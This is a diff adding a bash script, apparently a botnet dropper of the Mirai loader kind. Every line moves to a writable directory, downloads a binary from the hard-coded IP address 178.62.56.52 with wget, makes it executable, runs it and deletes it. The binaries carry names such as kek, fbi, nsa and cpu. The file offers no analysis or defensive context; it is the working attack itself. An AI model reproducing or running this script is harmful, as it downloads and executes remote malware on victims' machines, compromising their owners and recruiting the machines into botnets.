@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/kek; chmod +x kek; ./kek; rm -rf kek
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/bin; chmod +x bin; ./bin; rm -rf bin
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/yolo; chmod +x yolo; ./yolo; rm -rf yolo
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/feds; chmod +x feds; ./feds; rm -rf feds
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/fbi; chmod +x fbi; ./fbi; rm -rf fbi
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/nsa; chmod +x nsa; ./nsa; rm -rf nsa
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/cve; chmod +x cve; ./cve; rm -rf cve
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/gua; chmod +x gua; ./gua; rm -rf gua
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/pop; chmod +x pop; ./pop; rm -rf pop
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/ert; chmod +x ert; ./ert; rm -rf ert
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/cpu; chmod +x cpu; ./cpu; rm -rf cpu
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/dead; chmod +x dead; ./dead; rm -rf dead
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.56.52/tels; chmod +x tels; ./tels; rm -rf tels
